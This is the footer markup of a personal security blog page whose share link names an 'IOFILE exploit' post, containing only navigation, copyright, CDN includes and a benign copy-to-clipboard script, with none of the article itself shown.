  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/11/IOFILE-exploit/&t=IOFILE exploit"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2023
    DeePunk
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/DeePunk42">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
